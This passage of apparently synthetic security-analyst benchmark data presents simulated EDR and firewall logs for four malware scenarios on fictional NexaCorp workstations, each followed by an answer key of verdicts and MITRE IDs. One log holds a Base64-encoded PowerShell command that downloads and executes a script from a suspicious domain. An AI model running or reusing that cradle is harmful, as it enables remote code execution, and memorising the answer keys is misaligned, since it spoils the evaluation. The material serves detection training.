  "Endpoint"
 ],
 "description": "Known trojan-dropper signature match — file quarantined, malicious process killed, persistence artifact removed.",
 "display_name": "known_malware_family",
 "device": {
  "agent_load_flags": "0",
  "agent_version": "7.29.19807.0",
  "cid": "f282819d35e587637e1279e41c90bd3d",
  "config_id_build": "19807",
  "device_id": "e83f761b5b13a51df8be1239b6774960",
  "external_ip": "176.175.78.10",
  "first_seen": "2026-02-14T22:59:57Z",
  "hostname": "WS-OPS-2214",
  "last_seen": "2026-05-22T13:26:35Z",
  "local_ip": "10.23.127.181",
  "mac_address": "0a-ba-aa-bc-06-b9",
  "machine_domain": "NEXACORP.COM",
  "os_version": "Windows 11",
  "platform_name": "Windows",
  "product_type": "1",
  "product_type_desc": "Workstation",
  "status": "normal"
 },
 "falcon_host_link": "https://falcon.us-1.crowdstrike.com/activity-v2/detections/f282819d35e587637e1279e41c90bd3d:ind:e83f761b5b13a51df8be1239b6774960:211652166381-32902-7142405?_cid=f282819d35e587637e1279e41c90bd3d",
 "filename": "USB_Backup_Tool.exe",
 "filepath": "\\Device\\HarddiskVolume3\\Users\\s.levi\\Desktop\\USB_Backup_Tool.exe",
 "id": "ind:e83f761b5b13a51df8be1239b6774960:211652166381-32902-7142405",
 "indicator_id": "ind:e83f761b5b13a51df8be1239b6774960:211652166381-32902-7142405",
 "local_process_id": "7028",
 "logon_domain": "NEXACORP",
 "name": "known_malware_family",
 "pattern_disposition": 2048,
 "pattern_disposition_description": "Prevention, process killed.",
 "pattern_disposition_details": {
  "blocking_unsupported_or_disabled": false,
  "bootup_safeguard_enabled": false,
  "critical_process_disabled": false,
  "detect": false,
  "fs_operation_blocked": false,
  "handle_operation_downgraded": false,
  "inddet_mask": false,
  "indicator": false,
  "kill_action_failed": false,
  "kill_parent": false,
  "kill_process": true,
  "kill_subprocess": false,
  "operation_blocked": false,
  "policy_disabled": false,
  "process_blocked": false,
  "quarantine_file": fa
```

#### ANSWER KEY — usb-malware
- evt_usb_01_copy: verdict=- mitre=- authored: USB_Backup_Tool.exe was copied from a removable USB drive (E:\) to the Desktop on WS-OPS-2214.
- evt_usb_02_execute: verdict=tp mitre=T1204.002 authored: s.levi ran USB_Backup_Tool.exe on WS-OPS-2214 with explorer.exe as the parent process; the binary is unsigned.
- evt_usb_03_persist: verdict=tp mitre=T1547.001 authored: USB_Backup_Tool.exe wrote a Registry Run key on WS-OPS-2214 that relaunches it at every s.levi logon.
- evt_usb_04_detect: verdict=tp mitre=T1547.001 authored: CrowdStrike Falcon quarantined USB_Backup_Tool.exe on WS-OPS-2214 as a known trojan dropper and removed its Registry Run key.


### Story: browser-extension (foundation) — Sideloaded Browser Extension → PowerShell Spawned by Chrome

- 2026-05-25T09:00:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=low | host=WS-ENG-2093 | user=device-svc | "explorer.exe started chrome.exe on WS-ENG-2093"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "1018108",
 "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\device-svc\\Downloads\\perf_boost_ext_unpacked\"",
 "ComputerName": "WS-ENG-2093",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "463133637",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
 "ImageSubsystem": "2",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.10.20.18",
 "ParentAuthenticationId": "1018108",
 "ParentBaseFileName": "explorer.exe",
 "ParentProcessId": "212270455140",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1779699600.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "8814",
 "SessionId": "1",
 "SourceProcessId": "212270455140",
 "SourceThreadId": "116631210130",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "233884304517",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-8361",
 "WindowFlags": "128",
 "aid": "de3e5e6f73d2687ce1c9228b8d28bd8d",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "92bca74a-3b53-49af-9dc6-6a7dc9769ec8",
 "name": "ProcessRollup2V19",
 "timestamp": "1779699600275"
}
```

- 2026-05-25T09:02:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=high | host=WS-ENG-2093 | user=device-svc | "chrome.exe started powershell.exe on WS-ENG-2093"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "1018108",
 "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBhAHMAcwBlAHQAcwAtAHUAcABkAGEAdABlAC4AeAB5AHoALwBiAC4AcABzADEAJwApAA==",
 "ComputerName": "WS-ENG-2093",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "463133637",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
 "ImageSubsystem": "3",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.10.20.18",
 "ParentAuthenticationId": "1018108",
 "ParentBaseFileName": "chrome.exe",
 "ParentProcessId": "233884304517",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1779699720.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "9021",
 "SessionId": "1",
 "SignInfoFlags": "8683538",
 "SourceProcessId": "233884304517",
 "SourceThreadId": "116346084503",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "213310937150",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-8361",
 "WindowFlags": "128",
 "aid": "de3e5e6f73d2687ce1c9228b8d28bd8d",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "d00d49aa-7047-4b00-a710-ec3ea76ef522",
 "name": "ProcessRollup2V19",
 "timestamp": "1779699720195"
}
```

- 2026-05-25T09:02:30.000Z | badge=firewall | vendor=Fortinet FortiGate | sev=high | host=WS-ENG-2093 | user=device-svc | "WS-ENG-2093 connected to cdn-assets-update.xyz"

NATIVE — Fortinet FortiGate (FortiOS) (fortigate/utm/webfilter)
```
date=2026-05-25 time=09:02:30 devname="FGT-HQ-01" devid="FG200FTK19118636" eventtime=1779699750000000000 tz="+0000" logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_allow" level="notice" vd="root" policyid=33 poluuid="91917eba-5597-47d3-8d89-dc7c3d04794d" policytype="policy" sessionid=284844741 user="device-svc" authserver="NEXACORP-FSSO" srcip=10.10.20.18 srcport=53718 srccountry="Reserved" srcintf="port2" srcintfrole="lan" dstip=185.220.101.77 dstport=443 dstintf="port1" dstintfrole="wan" proto=6 service="HTTPS" hostname="cdn-assets-update.xyz" profile="Corp-WebFilter" action="passthrough" reqtype="direct" url="https://cdn-assets-update.xyz/" sentbyte=3072 rcvdbyte=40960 direction="outgoing" msg="URL belongs to an allowed category in policy" method="domain" cat=91 catdesc="Newly Registered Domain"
```

- 2026-05-25T09:04:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=critical | host=WS-ENG-2093 | user=device-svc | "Threat detected on WS-ENG-2093"

NATIVE — CrowdStrike Falcon (crowdstrike/alert)
```json
{
 "agent_id": "de3e5e6f73d2687ce1c9228b8d28bd8d",
 "aggregate_id": "aggind:de3e5e6f73d2687ce1c9228b8d28bd8d:47214213323",
 "alleged_filetype": "js",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "cloud_indicator": "false",
 "cmdline": "C:\\Users\\device-svc\\Downloads\\perf_boost_ext_unpacked\\background.js",
 "composite_id": "f282819d35e587637e1279e41c90bd3d:ind:de3e5e6f73d2687ce1c9228b8d28bd8d:270142593137-32902-5711863",
 "confidence": 90,
 "context_timestamp": "2026-05-25T09:04:00.000Z",
 "control_graph_id": "ctg:de3e5e6f73d2687ce1c9228b8d28bd8d:47214213323",
 "created_timestamp": "2026-05-25T09:04:14.801298921Z",
 "data_domains": [
  "Endpoint"
 ],
 "description": "Known malicious loader signature match on the sideloaded extension payload — process killed and extension folder quarantined.",
 "display_name": "known_malware_family",
 "device": {
  "agent_load_flags": "0",
  "agent_version": "7.29.19807.0",
  "cid": "f282819d35e587637e1279e41c90bd3d",
  "config_id_build": "19807",
  "device_id": "de3e5e6f73d2687ce1c9228b8d28bd8d",
  "external_ip": "176.175.78.10",
  "first_seen": "2026-02-06T01:03:05Z",
  "hostname": "WS-ENG-2093",
  "last_seen": "2026-05-25T08:59:03Z",
  "local_ip": "10.15.72.82",
  "mac_address": "d1-3e-0b-b7-c9-eb",
  "machine_domain": "NEXACORP.COM",
  "os_version": "Windows 11",
  "platform_name": "Windows",
  "product_type": "1",
  "product_type_desc": "Workstation",
  "status": "normal"
 },
 "falcon_host_link": "https://falcon.us-1.crowdstrike.com/activity-v2/detections/f282819d35e587637e1279e41c90bd3d:ind:de3e5e6f73d2687ce1c9228b8d28bd8d:270142593137-32902-5711863?_cid=f282819d35e587637e1279e41c90bd3d",
 "filename": "background.js",
 "filepath": "\\Device\\HarddiskVolume3\\Users\\device-svc\\Downloads\\perf_boost_ext_unpacked\\background.js",
 "id": "ind:de3e5e6f73d2687ce1c9228b8d28bd8d:270142593137-32902-5711863",
 "indicator_id": "ind:de3e5e6f73d2687ce1c9228b8d28bd8d:270142593137-32902-5711863",
 "local_process_id": "10836",
 "logon_domain": "NEXACORP",
 "name": "known_malware_family",
 "objective": "Follow Through",
 "pattern_disposition": 2048,
 "pattern_disposition_description": "Prevention, process killed.",
 "pattern_disposition_details": {
  "blocking_unsupported_or_disabled": false,
  "bootup_safeguard_enabled": false,
  "critical_process_disabled": false,
  "detect": false,
  "fs_operation_blocked": false,
  "handle_operation_downgraded": false,
  "inddet_mask": false,
  "indicator": false,
  "kill_action_failed": false,
  "kill_parent": false,
  "kill_process": true,
  "kill_subprocess": false,
  "operation_blocked":
```

#### ANSWER KEY — browser-extension
- evt_bext_01_sideload: verdict=tp mitre=T1176 authored: Chrome relaunched on WS-ENG-2093 with a --load-extension flag pointing to an unpacked folder in device-svc's Downloads directory.
- evt_bext_02_powershell: verdict=tp mitre=T1059.001 authored: chrome.exe on WS-ENG-2093 spawned powershell.exe directly, with a hidden window and a Base64-encoded command.
- evt_bext_03_beacon: verdict=tp mitre=T1071.001 authored: WS-ENG-2093 opened an outbound HTTPS connection to cdn-assets-update.xyz, a domain registered 4 days ago; the firewall allowed the session.
- evt_bext_04_detect: verdict=tp mitre=T1059.001 authored: CrowdStrike Falcon killed the encoded PowerShell process and quarantined the sideloaded extension folder on WS-ENG-2093, matching a known loader (family: ScriptBridge-variant).


### Story: tech-support-scam (foundation) — Tech-Support Scam → Unapproved Remote Access Tool

- 2026-05-27T14:00:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=low | host=WS-ACC-4477 | user=k.osei | "AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to k.osei's Downloads folder on WS-ACC-4477."

NATIVE — CrowdStrike Falcon (crowdstrike/alert)
```json
{
 "agent_id": "66d434346f1b714480b0a596d9194dfe",
 "aggregate_id": "aggind:66d434346f1b714480b0a596d9194dfe:56551640335",
 "alleged_filetype": "exe",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "cloud_indicator": "false",
 "cmdline": "C:\\Users\\k.osei\\Downloads\\AnyDesk.exe",
 "composite_id": "f282819d35e587637e1279e41c90bd3d:ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4561302",
 "confidence": 60,
 "context_timestamp": "2026-05-27T14:00:00.000Z",
 "control_graph_id": "ctg:66d434346f1b714480b0a596d9194dfe:56551640335",
 "created_timestamp": "2026-05-27T14:00:11.564501235Z",
 "data_domains": [
  "Endpoint"
 ],
 "description": "A process exhibited behavior consistent with Suspicious activity. Review the process tree and command line.",
 "display_name": "Suspicious activity",
 "device": {
  "agent_load_flags": "0",
  "agent_version": "7.29.19807.0",
  "cid": "f282819d35e587637e1279e41c90bd3d",
  "config_id_build": "19807",
  "device_id": "66d434346f1b714480b0a596d9194dfe",
  "external_ip": "176.175.78.10",
  "first_seen": "2025-11-25T01:17:08Z",
  "hostname": "WS-ACC-4477",
  "last_seen": "2026-05-27T13:50:50Z",
  "local_ip": "10.49.233.72",
  "mac_address": "7f-6f-f9-c2-00-5e",
  "machine_domain": "NEXACORP.COM",
  "os_version": "Windows 11",
  "platform_name": "Windows",
  "product_type": "1",
  "product_type_desc": "Workstation",
  "status": "normal"
 },
 "falcon_host_link": "https://falcon.us-1.crowdstrike.com/activity-v2/detections/f282819d35e587637e1279e41c90bd3d:ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4561302?_cid=f282819d35e587637e1279e41c90bd3d",
 "filename": "AnyDesk.exe",
 "filepath": "\\Device\\HarddiskVolume3\\Users\\k.osei\\Downloads\\AnyDesk.exe",
 "id": "ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4561302",
 "indicator_id": "ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4561302",
 "local_process_id": "1888",
 "logon_domain": "NEXACORP",
 "name": "SuspiciousActivity",
 "pattern_disposition": 0,
 "pattern_disposition_description": "Detection, standard detection.",
 "pattern_disposition_details": {
  "blocking_unsupported_or_disabled": false,
  "bootup_safeguard_enabled": false,
  "critical_process_disabled": false,
  "detect": false,
  "fs_operation_blocked": false,
  "handle_operation_downgraded": false,
  "inddet_mask": false,
  "indicator": false,
  "kill_action_failed": false,
  "kill_parent": false,
  "kill_process": false,
  "kill_subprocess": false,
  "operation_blocked": false,
  "policy_disabled": false,
  "process_blocked": false,
  "quarantine_file": false,
  "quarantine_machine":
```

- 2026-05-27T14:04:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=high | host=WS-ACC-4477 | user=k.osei | "explorer.exe started AnyDesk.exe on WS-ACC-4477"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "1975315",
 "AuthenticodeHashData": "1a28215c92d01065569888194435700aa774dc2910df4b0cd7a35e8c1ba22c7d",
 "CommandLine": "\"C:\\Users\\k.osei\\Downloads\\AnyDesk.exe\"",
 "ComputerName": "WS-ACC-4477",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "622929930",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Users\\k.osei\\Downloads\\AnyDesk.exe",
 "ImageSubsystem": "2",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.10.20.29",
 "ParentAuthenticationId": "1975315",
 "ParentBaseFileName": "explorer.exe",
 "ParentProcessId": "235311528941",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1779890640.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "5210",
 "SHA1HashData": "0000000000000000000000000000000000000000",
 "SHA256HashData": "9bb1a3108c1bf98fc6cfc48fe23f8daafce656e65af3dfdb615bcb90ef80780c",
 "SessionId": "1",
 "SignInfoFlags": "8683538",
 "SourceProcessId": "235311528941",
 "SourceThreadId": "155595409222",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "288530233340",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-6095",
 "WindowFlags": "128",
 "aid": "66d434346f1b714480b0a596d9194dfe",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "950ce10b-7ffb-484b-9731-5a05ba3ee1f6",
 "name": "ProcessRollup2V19",
 "timestamp": "1779890640941"
}
```

- 2026-05-27T14:05:30.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=medium | host=WS-ACC-4477 | user=k.osei | "AnyDesk.exe started cmd.exe on WS-ACC-4477"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "1975315",
 "CommandLine": "cmd.exe /c systeminfo & netstat -ano",
 "ComputerName": "WS-ACC-4477",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "622929930",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe",
 "ImageSubsystem": "3",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.49.233.72",
 "ParentAuthenticationId": "1975315",
 "ParentBaseFileName": "AnyDesk.exe",
 "ParentProcessId": "288530233340",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1779890730.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "5540",
 "SessionId": "1",
 "SignInfoFlags": "8683538",
 "SourceProcessId": "288530233340",
 "SourceThreadId": "149333934690",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "255450443147",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-6095",
 "WindowFlags": "128",
 "aid": "66d434346f1b714480b0a596d9194dfe",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "e5b6f29e-15de-4dbb-9187-3c563f3b21de",
 "name": "ProcessRollup2V19",
 "timestamp": "1779890730855"
}
```

- 2026-05-27T14:06:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=critical | host=WS-ACC-4477 | user=k.osei | "Threat detected on WS-ACC-4477"

NATIVE — CrowdStrike Falcon (crowdstrike/alert)
```json
{
 "agent_id": "66d434346f1b714480b0a596d9194dfe",
 "aggregate_id": "aggind:66d434346f1b714480b0a596d9194dfe:56551640335",
 "alleged_filetype": "exe",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "cloud_indicator": "false",
 "composite_id": "f282819d35e587637e1279e41c90bd3d:ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4445917",
 "confidence": 90,
 "context_timestamp": "2026-05-27T14:06:00.000Z",
 "control_graph_id": "ctg:66d434346f1b714480b0a596d9194dfe:56551640335",
 "created_timestamp": "2026-05-27T14:06:05.804658849Z",
 "data_domains": [
  "Endpoint"
 ],
 "description": "A process exhibited behavior consistent with Suspicious activity (T1219). Review the process tree and command line.",
 "display_name": "Suspicious activity",
 "device": {
  "agent_load_flags": "0",
  "agent_version": "7.29.19807.0",
  "cid": "f282819d35e587637e1279e41c90bd3d",
  "config_id_build": "19807",
  "device_id": "66d434346f1b714480b0a596d9194dfe",
  "external_ip": "176.175.78.10",
  "first_seen": "2025-11-25T01:17:08Z",
  "hostname": "WS-ACC-4477",
  "last_seen": "2026-05-27T14:05:04Z",
  "local_ip": "10.49.233.72",
  "mac_address": "7f-6f-f9-c2-00-5e",
  "machine_domain": "NEXACORP.COM",
  "os_version": "Windows 11",
  "platform_name": "Windows",
  "product_type": "1",
  "product_type_desc": "Workstation",
  "status": "normal"
 },
 "falcon_host_link": "https://falcon.us-1.crowdstrike.com/activity-v2/detections/f282819d35e587637e1279e41c90bd3d:ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4445917?_cid=f282819d35e587637e1279e41c90bd3d",
 "filename": "AnyDesk.exe",
 "id": "ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4445917",
 "indicator_id": "ind:66d434346f1b714480b0a596d9194dfe:264890765289-53420-4445917",
 "local_process_id": "1888",
 "logon_domain": "NEXACORP",
 "name": "SuspiciousActivity",
 "pattern_disposition": 16,
 "pattern_disposition_description": "Prevention, process blocked from execution.",
 "pattern_disposition_details": {
  "blocking_unsupported_or_disabled": false,
  "bootup_safeguard_enabled": false,
  "critical_process_disabled": false,
  "detect": false,
  "fs_operation_blocked": false,
  "handle_operation_downgraded": false,
  "inddet_mask": false,
  "indicator": false,
  "kill_action_failed": false,
  "kill_parent": false,
  "kill_process": false,
  "kill_subprocess": false,
  "operation_blocked": false,
  "policy_disabled": false,
  "process_blocked": true,
  "quarantine_file": false,
  "quarantine_machine": false,
  "registry_operation_blocked": false,
  "rooting": false,
  "sensor_only": false,
  "suspend_parent": false,
```

#### ANSWER KEY — tech-support-scam
- evt_rat_01_download: verdict=- mitre=- authored: AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to k.osei's Downloads folder on WS-ACC-4477.
- evt_rat_02_execute: verdict=tp mitre=T1219 authored: k.osei launched AnyDesk.exe on WS-ACC-4477 and granted remote-control access to an inbound session from an external caller.
- evt_rat_03_shell: verdict=tp mitre=T1059.003 authored: cmd.exe was spawned directly by AnyDesk.exe on WS-ACC-4477 and ran basic system and network enumeration commands.
- evt_rat_04_detect: verdict=tp mitre=T1219 authored: CrowdStrike Falcon terminated AnyDesk.exe on WS-ACC-4477 after flagging it as an unapproved remote-access tool controlling a session and spawning shell commands.


### Story: cracked-software (foundation) — Cracked Software Installer → Scheduled Task Persistence

- 2026-05-29T20:10:00.000Z | badge=firewall | vendor=Fortinet FortiGate | sev=low | host=WS-HR-1182 | user=a.jones | "WS-HR-1182 downloaded Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top at 20:10, following a sponsored search result click."

NATIVE — Fortinet FortiGate (FortiOS) (fortigate/utm/webfilter)
```
date=2026-05-29 time=20:10:00 devname="FGT-HQ-01" devid="FG200FTK19118636" eventtime=1780085400000000000 tz="+0000" logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_allow" level="notice" vd="root" policyid=33 poluuid="91917eba-5597-47d3-8d89-dc7c3d04794d" policytype="policy" sessionid=316904670 user="a.jones" authserver="NEXACORP-FSSO" srcip=10.10.20.55 srcport=58122 srccountry="Reserved" srcintf="port2" srcintfrole="lan" dstip=141.98.80.212 dstport=443 dstintf="port1" dstintfrole="wan" proto=6 service="HTTPS" hostname="fast-office-tools-download.top" profile="Corp-WebFilter" action="passthrough" reqtype="direct" url="https://fast-office-tools-download.top/" sentbyte=2048 rcvdbyte=18874368 direction="outgoing" msg="URL belongs to an allowed category in policy" method="domain" cat=52 catdesc="Information Technology"
```

- 2026-05-29T20:16:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=high | host=WS-HR-1182 | user=a.jones | "explorer.exe started Office_Pro_2026_Activator_Setup.exe on WS-HR-1182"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "8355197",
 "AuthenticodeHashData": "97df41f96c6cd65da2a267bb2b77dca8d183968c5dc9cd2d49405cff63a5dc79",
 "CommandLine": "\"C:\\Users\\a.jones\\Downloads\\Office_Pro_2026_Activator_Setup.exe\"",
 "ComputerName": "WS-HR-1182",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "3934731677",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Users\\a.jones\\Downloads\\Office_Pro_2026_Activator_Setup.exe",
 "ImageSubsystem": "2",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.10.20.55",
 "ParentAuthenticationId": "8355197",
 "ParentBaseFileName": "explorer.exe",
 "ParentProcessId": "244015823130",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1780085760.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "6120",
 "SHA1HashData": "0000000000000000000000000000000000000000",
 "SHA256HashData": "7ba55188e95ea47d69b5d6b8c34229d7e19c469b9ad02a7c4fb5fec12390da41",
 "SessionId": "1",
 "SourceProcessId": "244015823130",
 "SourceThreadId": "126704702026",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "221021247354",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-4786",
 "WindowFlags": "128",
 "aid": "d8243fb9d69724338e98fe197deaef2f",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "d3ddddf7-2afa-4dba-b747-e6b26fb9123a",
 "name": "ProcessRollup2V19",
 "timestamp": "1780085760371"
}
```

- 2026-05-29T20:16:40.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=high | host=WS-HR-1182 | user=a.jones | "Scheduled task ran on WS-HR-1182"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "8355197",
 "AuthenticodeHashData": "a9520c4d388f285e2ef3630e4f9c613bd6fe59d5c4e675fd7fb03f03609e8126",
 "CommandLine": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
 "ComputerName": "WS-HR-1182",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "3934731677",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\ProgramData\\OfficeTools\\svchelper.exe",
 "ImageSubsystem": "2",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.23.176.22",
 "ParentAuthenticationId": "8355197",
 "ParentBaseFileName": "Office_Pro_2026_Activator_Setup.exe",
 "ParentProcessId": "225212251451",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1780085800.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "2496",
 "SHA1HashData": "0000000000000000000000000000000000000000",
 "SHA256HashData": "77097f4423cd7e71ed1e747137f625f8b011b0116a35618adf6392c867f7e22d",
 "SessionId": "1",
 "SourceProcessId": "225212251451",
 "SourceThreadId": "134321073975",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "224102581401",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-4786",
 "WindowFlags": "128",
 "aid": "d8243fb9d69724338e98fe197deaef2f",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "8ca682bb-bd06-4f16-9951-f3ce626f9ee0",
 "name": "ProcessRollup2V19",
 "timestamp": "1780085800165"
}
```

- 2026-05-29T20:19:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=critical | host=WS-HR-1182 | user=a.jones | "Threat detected on WS-HR-1182"

NATIVE — CrowdStrike Falcon (crowdstrike/alert)
```json
{
 "agent_id": "d8243fb9d69724338e98fe197deaef2f",
 "aggregate_id": "aggind:d8243fb9d69724338e98fe197deaef2f:90227752175",
 "alleged_filetype": "exe",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "cloud_indicator": "false",
 "cmdline": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
 "composite_id": "f282819d35e587637e1279e41c90bd3d:ind:d8243fb9d69724338e98fe197deaef2f:224102581401-14474-6325944",
 "confidence": 90,
 "context_timestamp": "2026-05-29T20:19:00.000Z",
 "control_graph_id": "ctg:d8243fb9d69724338e98fe197deaef2f:90227752175",
 "created_timestamp": "2026-05-29T20:19:11.465836202Z",
 "data_domains": [
  "Endpoint"
 ],
 "description": "This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.",
 "display_name": "Trojan:Win32/Wacatac.B!ml",
 "device": {
  "agent_load_flags": "0",
  "agent_version": "7.29.19807.0",
  "cid": "f282819d35e587637e1279e41c90bd3d",
  "config_id_build": "19807",
  "device_id": "d8243fb9d69724338e98fe197deaef2f",
  "external_ip": "176.175.78.10",
  "first_seen": "2026-01-04T11:09:08Z",
  "hostname": "WS-HR-1182",
  "last_seen": "2026-05-29T20:17:48Z",
  "local_ip": "10.23.176.22",
  "mac_address": "e1-b4-75-e7-4d-b2",
  "machine_domain": "NEXACORP.COM",
  "os_version": "Windows 11",
  "platform_name": "Windows",
  "product_type": "1",
  "product_type_desc": "Workstation",
  "status": "normal"
 },
 "falcon_host_link": "https://falcon.us-1.crowdstrike.com/activity-v2/detections/f282819d35e587637e1279e41c90bd3d:ind:d8243fb9d69724338e98fe197deaef2f:224102581401-14474-6325944?_cid=f282819d35e587637e1279e41c90bd3d",
 "filename": "svchelper.exe",
 "filepath": "\\Device\\HarddiskVolume3\\ProgramData\\OfficeTools\\svchelper.exe",
 "id": "ind:d8243fb9d69724338e98fe197deaef2f:224102581401-14474-6325944",
 "indicator_id": "ind:d8243fb9d69724338e98fe197deaef2f:224102581401-14474-6325944",
 "local_process_id": "2496",
 "logon_domain": "NEXACORP",
 "name": "TrojanWin32WacatacBMl",
 "pattern_disposition": 2304,
 "pattern_disposition_description": "Prevention, process killed and file quarantined.",
 "pattern_disposition_details": {
  "blocking_unsupported_or_disabled": false,
  "bootup_safeguard_enabled": false,
